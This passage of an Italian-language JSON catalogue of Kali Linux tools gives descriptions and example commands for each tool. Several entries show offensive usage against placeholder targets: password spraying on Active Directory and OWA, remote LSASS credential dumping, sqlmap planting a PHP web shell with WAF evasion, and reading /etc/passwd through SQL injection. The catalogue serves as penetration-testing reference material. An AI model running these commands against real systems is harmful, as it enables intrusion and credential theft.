    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sparrow-WiFi</strong> è un analizzatore wireless con interfaccia grafica per spectrum analysis, geolocalizzazione e drone detection. Integra GPS per mapping, supporta HackRF per analisi spectrum e ha funzionalità di drone hunting.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WiFi Analysis:</strong> visualizza AP, client, signal strength</p><p><strong>GPS Integration:</strong> geolocalizza access point su mappa</p><p><strong>Spectrum Analysis:</strong> supporto HackRF per RF spectrum</p><p><strong>Drone Detection:</strong> identifica segnali WiFi droni comuni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI\nsparrow-wifi\n\n# Con interfaccia specifica\nsparrow-wifi -i wlan0\n\n# Abilita GPS\nsparrow-wifi -i wlan0 --gps\n\n# Modalità drone hunting\nsparrow-wifi -i wlan0 --drone</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>wireless audit</strong>, mappa reti WiFi nell'area.</p><p>Per <strong>wardriving</strong>, raccoglie dati geolocalizzati su AP.</p><p>Per <strong>security</strong>, rileva droni non autorizzati via WiFi signature.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Monitor Mode:</strong> richiede scheda in monitor mode.</p><p><strong>Legal:</strong> wardriving può avere implicazioni legali.</p><p><strong>Privacy:</strong> raccolta dati WiFi regolamentata in alcune giurisdizioni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "spiderfoot",
    "name": "spiderfoot",
    "version": "4.0",
    "icon": "../app/icons/spiderfoot-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spiderfoot/",
    "desc": "Piattaforma OSINT automatizzata con 200+ moduli per footprinting e threat intelligence.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SpiderFoot</strong> è una piattaforma OSINT automatizzata con oltre 200 moduli per footprinting e threat intelligence. Raccoglie dati da fonti pubbliche, correla informazioni e genera report completi con visualizzazioni grafiche.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>200+ Modules:</strong> DNS, WHOIS, social, breach data, dark web</p><p><strong>Correlation Engine:</strong> collega entità automaticamente</p><p><strong>Web Interface:</strong> GUI browser-based per gestione scan</p><p><strong>API Integration:</strong> supporta Shodan, VirusTotal, HaveIBeenPwned</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia web interface\nspiderfoot -l 127.0.0.1:5001\n\n# Scan CLI su dominio\nspiderfoot -s target.com -t DOMAIN_NAME\n\n# Scan su IP\nspiderfoot -s 192.168.1.1 -t IP_ADDRESS\n\n# Con moduli specifici\nspiderfoot -s target.com -m sfp_dnsresolve,sfp_whois</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>threat intelligence</strong>, indaga su attori malevoli.</p><p>Per <strong>due diligence</strong>, verifica aziende e persone.</p><p>Per <strong>attack surface</strong>, mappa esposizione digitale di un'organizzazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Keys:</strong> molti moduli richiedono chiavi API.</p><p><strong>Passive vs Active:</strong> alcuni moduli generano traffico verso il target.</p><p><strong>Data Storage:</strong> risultati contengono dati sensibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "sploitscan",
    "name": "sploitscan",
    "version": "0.10.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sploitscan/",
    "desc": "Cerca CVE e exploit disponibili aggregando info da NVD, EPSS, CISA KEV.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SploitScan</strong> è uno strumento che aggrega informazioni su CVE da multiple fonti: NVD, EPSS, CISA KEV, Exploit-DB. Fornisce una vista unificata su severità, probabilità di exploit e disponibilità di PoC.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source:</strong> NVD, EPSS, CISA KEV, Exploit-DB</p><p><strong>EPSS Score:</strong> probabilità di exploitation nei prossimi 30 giorni</p><p><strong>KEV Status:</strong> verifica se CVE è in CISA Known Exploited</p><p><strong>PoC Links:</strong> trova exploit pubblici disponibili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca informazioni su CVE\nsploitscan CVE-2024-1234\n\n# Multipli CVE\nsploitscan CVE-2024-1234 CVE-2024-5678\n\n# Da file\nsploitscan -f cve_list.txt\n\n# Output JSON\nsploitscan CVE-2024-1234 -o json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability prioritization</strong>, valuta rischio reale di CVE.</p><p>Per <strong>threat intel</strong>, identifica vulnerabilità attivamente sfruttate.</p><p>Per <strong>exploit research</strong>, trova PoC disponibili pubblicamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Limits:</strong> alcune fonti hanno rate limiting.</p><p><strong>Internet Required:</strong> richiede connettività per query.</p><p><strong>Data Currency:</strong> informazioni dipendono da aggiornamento fonti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "spooftooph",
    "name": "spooftooph",
    "version": "0.5.2",
    "icon": "../app/icons/spooftooph-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spooftooph/",
    "desc": "Clona dispositivi Bluetooth spoofando indirizzo MAC e device class per attacchi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Spooftooph</strong> è uno strumento per spoofing Bluetooth che clona l'identità di dispositivi BT. Modifica indirizzo MAC, device name e class del dispositivo locale per impersonare altri device Bluetooth.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MAC Spoofing:</strong> cambia BD_ADDR del dispositivo locale</p><p><strong>Name Cloning:</strong> copia nome del dispositivo target</p><p><strong>Class Spoofing:</strong> replica device class (phone, headset, etc.)</p><p><strong>Profile Selection:</strong> salva/carica profili dispositivo</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione dispositivi nelle vicinanze\nspooftooph -s\n\n# Clona dispositivo specifico\nspooftooph -i hci0 -a 00:11:22:33:44:55 -n \"iPhone\"\n\n# Randomizza MAC\nspooftooph -i hci0 -r\n\n# Salva profilo\nspooftooph -i hci0 -w profile.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>BT security testing</strong>, valuta trust basato su identità.</p><p>Per <strong>social engineering</strong>, impersona dispositivi trusted.</p><p>Per <strong>privacy</strong>, nasconde vera identità Bluetooth.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware:</strong> richiede adapter BT che supporta spoofing.</p><p><strong>Legal:</strong> impersonare dispositivi può essere illegale.</p><p><strong>Range:</strong> Bluetooth ha range limitato, richiede prossimità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "spray",
    "name": "spray",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spray/",
    "desc": "Password spraying tool per Active Directory via SMB con rate limiting integrato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Spray</strong> è uno strumento per password spraying su Active Directory via protocollo SMB. Include rate limiting integrato per evitare lockout account e supporta liste di utenti e password per attacchi mirati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SMB Authentication:</strong> verifica credenziali via SMB/NTLM</p><p><strong>Rate Limiting:</strong> delay configurabile tra tentativi</p><p><strong>Lockout Aware:</strong> evita lockout con threshold configurato</p><p><strong>Multi-Password:</strong> testa multiple password su utenti</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Spray singola password su lista utenti\nspray -u users.txt -p 'Password123' -d domain.local 192.168.1.10\n\n# Con delay tra tentativi\nspray -u users.txt -p 'Summer2024!' -d domain.local -t 3 192.168.1.10\n\n# Lista password\nspray -u users.txt -P passwords.txt -d domain.local 192.168.1.10\n\n# Output verboso\nspray -u users.txt -p 'Welcome1' -d domain.local -v 192.168.1.10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD assessment</strong>, identifica utenti con password deboli.</p><p>Per <strong>initial access</strong>, trova credenziali valide senza lockout.</p><p>Per <strong>policy testing</strong>, verifica enforcement password policy.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> rispettare threshold per evitare blocchi.</p><p><strong>Logging:</strong> tentativi loggati in Security event log (4625).</p><p><strong>Detection:</strong> pattern spraying riconoscibile da SIEM.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Spraying"
    ],
    "notes": null
  },
  {
    "id": "sprayhound",
    "name": "sprayhound",
    "version": "0.0~git20241231.5e7bf94",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sprayhound/",
    "desc": "Password spraying sicuro su AD con integrazione BloodHound per evitare lockout.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SprayHound</strong> è uno strumento di password spraying per Active Directory che integra dati BloodHound per evitare lockout. Consulta i bad password count degli utenti prima dello spray per operare in modo sicuro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>BloodHound Integration:</strong> usa dati Neo4j per info utenti</p><p><strong>Lockout Aware:</strong> controlla badPwdCount prima di spray</p><p><strong>Threshold Respect:</strong> si ferma prima del lockout threshold</p><p><strong>Smart Targeting:</strong> seleziona utenti sicuri da testare</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Spray con controllo BloodHound\nsprayhound -u users.txt -p 'Password123' -d domain.local -dc dc01.domain.local\n\n# Con connessione Neo4j\nsprayhound -u users.txt -p 'Welcome1' --neo4j-uri bolt://localhost:7687\n\n# Specifica threshold\nsprayhound -u users.txt -p 'Summer2024!' -d domain.local --threshold 3</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>safe spraying</strong>, evita lockout account durante assessment.</p><p>Per <strong>targeted attacks</strong>, seleziona utenti con badPwdCount basso.</p><p>Per <strong>AD testing</strong>, verifica password policy senza causare disservizi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>BloodHound Data:</strong> richiede dati raccolti precedentemente.</p><p><strong>Logging:</strong> tentativi comunque loggati nel DC.</p><p><strong>Timing:</strong> rispettare observation window della policy.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Spraying"
    ],
    "notes": null
  },
  {
    "id": "sprayingtoolkit",
    "name": "sprayingtoolkit",
    "version": "0.0~git20201009.68f295d",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sprayingtoolkit/",
    "desc": "Password spray su OWA, Lync, ADFS e altri portali Microsoft cloud e on-premise.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SprayingToolkit</strong> è una suite per password spraying su servizi Microsoft: OWA, Lync/Skype for Business, ADFS, O365. Include moduli specifici per ogni servizio con gestione rate limiting.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Service:</strong> OWA, Lync, ADFS, Office 365</p><p><strong>User Enumeration:</strong> verifica esistenza utenti prima dello spray</p><p><strong>Rate Limiting:</strong> delay configurabile per evitare blocchi</p><p><strong>Atomizer Module:</strong> spray su diverse piattaforme</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Spray su OWA\natomizer owa https://mail.target.com users.txt password.txt\n\n# Spray su Lync\natomizer lync https://lyncdiscover.target.com users.txt password.txt\n\n# Spray su ADFS\natomizer adfs https://adfs.target.com users.txt password.txt\n\n# Con delay\natomizer owa https://mail.target.com users.txt pass.txt --interval 5</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>external assessment</strong>, testa portali Microsoft esposti.</p><p>Per <strong>initial access</strong>, trova credenziali per accesso OWA/O365.</p><p>Per <strong>phishing prep</strong>, identifica utenti con password deboli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> servizi cloud hanno throttling aggressivo.</p><p><strong>MFA:</strong> molti servizi richiedono secondo fattore.</p><p><strong>Logging:</strong> Azure AD logga tutti i tentativi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Spraying"
    ],
    "notes": null
  },
  {
    "id": "spraykatz",
    "name": "spraykatz",
    "version": "0.9.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spraykatz/",
    "desc": "Dumpa credenziali da memoria LSASS su host Windows remoti via procdump e Mimikatz.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SprayKatz</strong> è uno strumento per credential dumping remoto che utilizza procdump per creare dump LSASS e pypykatz per estrazione offline. Automatizza il processo su multipli host Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Remote Dumping:</strong> esegue procdump via SMB/WMI remoto</p><p><strong>Offline Extraction:</strong> analizza dump con pypykatz</p><p><strong>Mass Deployment:</strong> opera su liste di host</p><p><strong>Cleanup:</strong> rimuove dump dopo estrazione</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump da singolo host\nspraykatz -u admin -p password -d domain.local -t 192.168.1.100\n\n# Da lista di host\nspraykatz -u admin -p password -d domain.local -T hosts.txt\n\n# Con hash NTLM\nspraykatz -u admin -H aad3b435b51404eeaad3b435b51404ee:hash -t 192.168.1.100\n\n# Output directory\nspraykatz -u admin -p pass -d domain.local -t target -o ./output</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>credential harvesting</strong>, raccoglie password da host compromessi.</p><p>Per <strong>lateral movement prep</strong>, ottiene credenziali per pivot.</p><p>Per <strong>domain escalation</strong>, cerca credenziali privilegiate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>EDR Detection:</strong> procdump e dump LSASS altamente monitorati.</p><p><strong>Sysmon:</strong> eventi 1, 10 rivelano l'attività.</p><p><strong>AV:</strong> Mimikatz e pypykatz sono signature-based.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "sqldict",
    "name": "sqldict",
    "version": "2.1",
    "icon": "../app/icons/sqldict-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqldict/",
    "desc": "Brute force password per account SQL Server usando wordlist e parallel attacks.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SQLDict</strong> è uno strumento per brute force di password su Microsoft SQL Server. Effettua attacchi dizionario paralleli per testare la robustezza delle credenziali degli account database.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dictionary Attack:</strong> usa wordlist per brute force</p><p><strong>Parallel Connections:</strong> multiple connessioni simultanee</p><p><strong>User Enumeration:</strong> testa liste di username</p><p><strong>MSSQL Focus:</strong> ottimizzato per SQL Server</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Brute force su sa\nsqldict 192.168.1.100 sa passwords.txt\n\n# Con porta custom\nsqldict 192.168.1.100:1434 sa passwords.txt\n\n# Multipli utenti\nsqldict 192.168.1.100 users.txt passwords.txt\n\n# Threads paralleli\nsqldict 192.168.1.100 sa passwords.txt -t 10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>database assessment</strong>, verifica password account SQL.</p><p>Per <strong>pentest</strong>, tenta accesso a database MSSQL.</p><p>Per <strong>audit</strong>, controlla enforcement password policy.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> SQL Server può avere lockout policy.</p><p><strong>Logging:</strong> tentativi falliti loggati in SQL errorlog.</p><p><strong>Detection:</strong> molte connessioni fallite generano alert.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlmap",
    "name": "sqlmap",
    "version": "1.9.8",
    "icon": "../app/icons/sqlmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlmap/",
    "desc": "Tool automatico per SQL injection: detection, exploitation, data extraction e takeover.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SQLMap</strong> è lo strumento di riferimento per detection e exploitation automatica di SQL injection. Supporta tutti i DBMS principali, tecniche di injection multiple e funzionalità avanzate come OS shell e database takeover.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Detection:</strong> identifica tipo SQLi e DBMS automaticamente</p><p><strong>Full DBMS Support:</strong> MySQL, PostgreSQL, MSSQL, Oracle, SQLite</p><p><strong>Data Extraction:</strong> dump database, tabelle, colonne</p><p><strong>OS Access:</strong> shell, file read/write su sistemi vulnerabili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration completa con risk e level alti\nsqlmap -u \"http://target.com/page?id=1\" --dbs --risk=3 --level=5 --batch\n\n# Da Burp request file con cookie e proxy\nsqlmap -r request.txt --batch --proxy=http://127.0.0.1:8080 \\\n  --cookie=\"PHPSESSID=abc123\" --random-agent\n\n# Dump specifico con evasione WAF avanzata\nsqlmap -u \"http://target.com/page?id=1\" -D mydb -T users --dump \\\n  --tamper=\"between,randomcase,space2comment\" --delay=2\n\n# Second-order injection\nsqlmap -u \"http://target.com/view\" --second-url=\"http://target.com/result\" \\\n  --data=\"input=*\" --technique=U\n\n# OS shell con tecniche alternative\nsqlmap -u \"http://target.com/page?id=1\" --os-shell --technique=E \\\n  --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php\n\n# Time-based blind con threads ottimizzati\nsqlmap -u \"http://target.com/page?id=1\" --technique=T --time-sec=3 --threads=10\n\n# POST JSON API con header custom\nsqlmap -u \"http://api.target.com/search\" --data='{\"query\":\"*\"}' \\\n  --method=POST -H \"Content-Type: application/json\" -H \"Authorization: Bearer xxx\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web pentest</strong>, testa e sfrutta SQL injection.</p><p>Per <strong>data extraction</strong>, recupera contenuti database.</p><p>Per <strong>privilege escalation</strong>, ottiene shell o accesso filesystem.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> genera molte richieste anomale.</p><p><strong>WAF:</strong> facilmente bloccato, usare tamper scripts.</p><p><strong>Logging:</strong> tutte le query loggabili lato server.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlmc",
    "name": "sqlmc",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlmc/",
    "desc": "Crawla sito web cercando parametri SQL injectable e testa automaticamente per SQLi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SQLMC</strong> (SQL Mass Checker) è uno scanner che crawla siti web alla ricerca di parametri vulnerabili a SQL injection. Combina web crawling con testing automatico per identificare punti di injection.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Crawling:</strong> esplora automaticamente il sito target</p><p><strong>Parameter Discovery:</strong> identifica parametri GET/POST</p><p><strong>SQLi Testing:</strong> testa payload injection comuni</p><p><strong>Report Generation:</strong> genera report vulnerabilità trovate</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan sito per SQLi\nsqlmc -u http://target.com/\n\n# Con depth crawling\nsqlmc -u http://target.com/ -d 3\n\n# Specifica thread\nsqlmc -u http://target.com/ -t 10\n\n# Output file\nsqlmc -u http://target.com/ -o results.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability discovery</strong>, trova punti SQLi in applicazioni grandi.</p><p>Per <strong>bug bounty</strong>, scansiona rapidamente per low-hanging fruit.</p><p>Per <strong>security assessment</strong>, identifica parametri da testare manualmente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> crawling genera molto traffico.</p><p><strong>Detection:</strong> pattern injection riconoscibili da WAF.</p><p><strong>False Positives:</strong> verificare manualmente i risultati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlninja",
    "name": "sqlninja",
    "version": "0.2.6",
    "icon": "../app/icons/sqlninja-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlninja/",
    "desc": "Exploita SQL injection su MSSQL per shell, privilege escalation e data exfiltration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SQLNinja</strong> è uno strumento specializzato per exploitation di SQL injection su Microsoft SQL Server. Focalizzato su post-exploitation, permette di ottenere shell, escalare privilegi e exfiltrare dati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MSSQL Focus:</strong> ottimizzato per SQL Server</p><p><strong>Shell Upload:</strong> carica backdoor via xp_cmdshell</p><p><strong>Privilege Escalation:</strong> tecniche per elevare a sa</p><p><strong>DNS Exfiltration:</strong> estrae dati via query DNS</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Fingerprint database\nsqlninja -m fingerprint\n\n# Brute force sa password\nsqlninja -m bruteforce\n\n# Upload shell\nsqlninja -m upload\n\n# Ottieni reverse shell\nsqlninja -m backscan\n\n# Escalation\nsqlninja -m escalation</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>MSSQL exploitation</strong>, sfrutta SQLi per accesso sistema.</p><p>Per <strong>data exfil</strong>, estrae dati quando canali tradizionali sono bloccati.</p><p>Per <strong>privilege escalation</strong>, eleva da db_owner a sysadmin.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>xp_cmdshell:</strong> spesso disabilitato e monitorato.</p><p><strong>Detection:</strong> attività SQL anomale facilmente rilevabili.</p><p><strong>Logging:</strong> tutte le query in SQL Server logs.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlsus",
    "name": "sqlsus",
    "version": "0.7.2",
    "icon": "../app/icons/sqlsus-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlsus/",
    "desc": "Injection tool MySQL con interfaccia command-line per dump database e file read.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SQLSus</strong> è uno strumento di SQL injection specializzato per MySQL. Offre interfaccia command-line interattiva per esplorare database, dumpare dati e leggere file dal filesystem del server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MySQL Focus:</strong> ottimizzato per MySQL/MariaDB</p><p><strong>Interactive Shell:</strong> CLI simile a MySQL client</p><p><strong>File Read:</strong> legge file via LOAD_FILE()</p><p><strong>Auto-Detection:</strong> identifica columns e union-based injection</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera configurazione\nsqlsus -g config.cfg\n\n# Avvia con config\nsqlsus config.cfg\n\n# Comandi interattivi:\nstart          # inizia injection\nget databases  # lista database\nget tables     # lista tabelle\nget columns    # lista colonne\nget file /etc/passwd  # legge file</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>MySQL exploitation</strong>, esplora database via SQLi.</p><p>Per <strong>file read</strong>, accede a file di configurazione.</p><p>Per <strong>data extraction</strong>, dumpa tabelle con credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>File Permissions:</strong> LOAD_FILE richiede FILE privilege.</p><p><strong>Logging:</strong> query loggabili in slow query log.</p><p><strong>Detection:</strong> UNION-based injection facilmente rilevabile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "ssdeep",
    "name": "ssdeep",
    "version": "2.14.1",
    "icon": "../app/icons/ssdeep-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ssdeep/",
    "desc": "Calcola fuzzy hash per identificare file simili in analisi malware e forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ssdeep</strong> è uno strumento per calcolare fuzzy hash (context-triggered piecewise hashing). A differenza di hash crittografici, identifica file simili anche con modifiche minori, utile per clustering malware.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fuzzy Hashing:</strong> CTPH per similarity detection</p><p><strong>Comparison:</strong> calcola percentuale similarità tra file</p><p><strong>Recursive:</strong> processa directory ricorsivamente</p><p><strong>Cluster Analysis:</strong> raggruppa file simili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera database hash da samples noti\nssdeep -b -r /malware/known_families/ &gt; malware_signatures.ssdeep\n\n# Confronta sample sospetto contro database\nssdeep -m malware_signatures.ssdeep -t 70 suspect.exe  # threshold 70%\n\n# Clustering malware: trova varianti simili\nssdeep -p -r /samples/ | sort -t: -k3 -nr | head -50  # top 50 matches\n\n# Pipeline con VirusTotal hash per triage\nfor f in /incoming/*.exe; do\n  ssdeep \"$f\" &gt;&gt; hashes.txt\n  sha256=$(sha256sum \"$f\" | cut -d' ' -f1)\n  curl -s \"https://www.virustotal.com/api/v3/files/$sha256\" -H \"x-apikey: KEY\"\ndone\n\n# Confronto cross-directory per similarity\nssdeep -l -r /samples/family_a/ &gt; family_a.ssdeep\nssdeep -x family_a.ssdeep -r /samples/unknown/\n\n# Output CSV per analisi in Jupyter/Pandas\nssdeep -c -r /samples/ &gt; similarity_matrix.csv</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, raggruppa varianti della stessa famiglia.</p><p>Per <strong>forensics</strong>, trova file modificati leggermente.</p><p>Per <strong>threat intel</strong>, identifica relazioni tra samples.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>False Positives:</strong> similarità non implica stesso malware.</p><p><strong>Performance:</strong> confronto O(n²) su grandi dataset.</p><p><strong>Limitations:</strong> packed/encrypted files possono dare risultati errati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "sshuttle",
    "name": "sshuttle",
    "version": "1.3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sshuttle/",
    "desc": "VPN over SSH trasparente: tunneling completo senza bisogno di configurazione server.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>sshuttle</strong> è una VPN trasparente over SSH che non richiede configurazione server. Usa Python e iptables per creare tunnel che instradano tutto il traffico attraverso la connessione SSH.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zero Config Server:</strong> richiede solo SSH e Python sul target</p><p><strong>Transparent Proxy:</strong> tutto il traffico passa per il tunnel</p><p><strong>Subnet Routing:</strong> instrada subnet specifiche</p><p><strong>DNS Forwarding:</strong> risolve DNS attraverso il tunnel</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Tunnel per subnet interna via jump host\nsshuttle -r user@jumphost 10.0.0.0/8 172.16.0.0/12 --dns\n\n# Full tunnel con esclusione host locale\nsshuttle -r user@jumphost 0/0 -x jumphost_ip/32 --python=/usr/bin/python3\n\n# Chain attraverso bastion con ProxyJump\nsshuttle -r user@internal -e 'ssh -J user@bastion' 192.168.0.0/16\n\n# Background daemon con autorestart\nsshuttle --daemon --pidfile=/tmp/sshuttle.pid -r user@jumphost 10.0.0.0/8 &amp;&amp; \\\n  echo \"Tunnel running, nmap interno possibile\"\n\n# Con chiave SSH e porta non standard\nsshuttle -r user@jumphost:2222 10.0.0.0/8 -e 'ssh -i ~/.ssh/pentest_key -o StrictHostKeyChecking=no'\n\n# Multipli subnet per pentest completo\nsshuttle -r root@pwned 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 --dns -v\n\n# Combine con proxychains per tool non supportati\nsshuttle -r user@jumphost 10.0.0.0/8 &amp;&amp; nmap -sT -Pn 10.0.0.0/24</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>pivoting</strong>, accede a reti interne via jump host.</p><p>Per <strong>pentest</strong>, raggiungi subnet non direttamente accessibili.</p><p>Per <strong>bypass firewall</strong>, tunnel attraverso SSH consentito.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>SSH Logs:</strong> connessione SSH visibile nei log.</p><p><strong>Traffic:</strong> tutto il traffico passa per l'host SSH.</p><p><strong>Permissions:</strong> richiede root locale per 